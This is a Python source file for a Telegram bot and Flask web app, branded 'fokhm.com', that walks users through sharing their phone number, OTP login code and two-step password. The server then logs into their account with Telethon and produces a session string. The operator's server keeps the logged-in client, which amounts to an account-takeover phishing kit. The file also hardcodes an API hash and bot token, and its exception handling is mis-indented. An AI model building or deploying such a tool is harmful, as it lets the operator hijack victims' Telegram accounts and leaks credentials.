from flask import Flask, render_template_string, request
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os
import threading
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler

app = Flask(__name__)

API_ID = 25757508
API_HASH = '3091fbda91d4b133207779ddf81fee39'
BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")

# تخزين الجلسات المؤقتة لكل مستخدم في الذاكرة
active_sessions = {}

# واجهة Web App متطورة مع زر المشاركة التلقائية الفورية للرقم
WEB_APP_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة fokhm.com - استخراج الجلسة</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0f172a; color: #fff; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); width: 320px; text-align: center; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 16px; text-align: center; }
        button { width: 95%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:hover { background: #1d4ed8; }
        .msg { color: #f87171; font-size: 14px; margin-bottom: 10px; }
        .success { color: #4ade80; font-size: 13px; word-break: break-all; background: #0f172a; padding: 10px; border-radius: 6px; text-align: left; direction: ltr; max-height: 150px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="card">
        <h2>منصة fokhm.com</h2>
        <div id="content">
            <p>انقر أدناه لمشاركة رقم هاتفك بضغطة زر واحدة:</p>
            <button onclick="requestPhone()">📱 مشاركة رقم الهاتف تلقائياً</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user_' + Math.random();

        function requestPhone() {
            if (tg.requestContact) {
                tg.requestContact((shared, contact) => {
                    if (shared && contact) {
                        callApi('phone', '+' + contact.phone_number);
                    } else {
                        alert("عذراً، يجب مشاركة الرقم للمتابعة.");
                    }
                });
            } else {
                let phone = prompt("أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):");
                if (phone) callApi('phone', phone);
            }
        }

        function callApi(action, value) {
            fetch('/api', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: action,
                    value: value,
                    user_id: currentUserId
                })
            })
            .then(res => res.json())
            .then(data => {
                let html = '';
                if (data.status === 'need_code') {
                    html = `<p>✅ تم استلام الرقم بنجاح.<br>أدخل رمز التحقق (OTP) الذي وصلك:</p>
                            <input type="text" id="code_val" placeholder="12345">
                            <button onclick="submitCode()">تأكيد الكود</button>`;
                } else if (data.status === 'need_password') {
                    html = `<p>الحساب محمي بكلمة مرور (تحقق بخطوتين):</p>
                            <input type="password" id="pass_val" placeholder="كلمة المرور">
                            <button onclick="submitPassword()">تحقق</button>`;
                } else if (data.status === 'done') {
                    html = `<h3 style="color: #4ade80;">✅ تمت العملية بنجاح يا فخم!</h3>
                            <p>نسخ جلسة حسابك:</p>
                            <div class="success">${data.session}</div>`;
                } else {
                    html = `<p class="msg">${data.message}</p>
                            <button onclick="location.reload()">إعادة المحاولة</button>`;
                }
                document.getElementById('content').innerHTML = html;
            });
        }

        function submitCode() {
            let code = document.getElementById('code_val').value;
            if(!code) { alert("أدخل الكود أولاً"); return; }
            callApi('code', code);
        }

        function submitPassword() {
            let pass = document.getElementById('pass_val').value;
            if(!pass) { alert("أدخل كلمة المرور أولاً"); return; }
            callApi('password', pass);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(WEB_APP_HTML)

@app.route('/api', methods=['POST'])
def api():
    global active_sessions
    data = request.json
    action = data.get('action')
    value = data.get('value')
    user_id = str(data.get('user_id'))

    try:
        if action == 'phone':
            phone = value
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(client.connect())
            
            sent_code = loop.run_until_complete(client.send_code_request(phone))
            
            active_sessions[user_id] = {
                'client': client,
                'loop': loop,
                'phone': phone,
                'hash': sent_code.phone_code_hash
            }
            return {"status": "need_code"}

        elif action == 'code':
            session_data = active_sessions.get(user_id)
            if not session_data:
                return {"status": "error", "message": "انتهت الجلسة، اعد المحاولة."}
            
            client = session_data['client']
            loop = session_data['loop']
            code = value
            
            try:
                loop.run_until_complete(client.sign_in(session_data['phone'], code, phone_code_hash=session_data['hash']))
                session_str = client.session.save()
                return {"status": "done", "session": session_str}
            except Exception as e:
                err_str = str(e)
                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
                    return {"status": "need_password"}
                else:
                    return {"status": "error", "message": err_str}

        elif action == 'password':
            session_data = active_sessions.get(user_id)
            if not session_data:
                return {"status": "error", "message": "انتهت الجلسة."}
            
            client = session_data['client']
            loop = session_data['loop']
            password = value
            
            try:
                loop.run_until_complete(client.sign_in(password=password))
                session_str = client.session.save()
                return {"status": "done", "session": session_str}
            except Exception as e:
                return {"status": "error", "message": f"كلمة المرور خطأ: {e}"}

    except Exception as e:
    return {"status": "error", "message": str(e)}

    return {"status": "error", "message": "طلب غير معروف"}

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
    if not web_url.startswith('http'):
        web_url = f"https://{web_url}"
        
    keyboard = [[InlineKeyboardButton("🚀 فتح منصة fokhm.com", web_app=WebAppInfo(url=web_url))]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لفتح الـ Web App ومشاركة رقمك بضغطة زر واحدة:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    
    print("Fokhm Auto-Contact Bot is running...")
    application.run_polling()

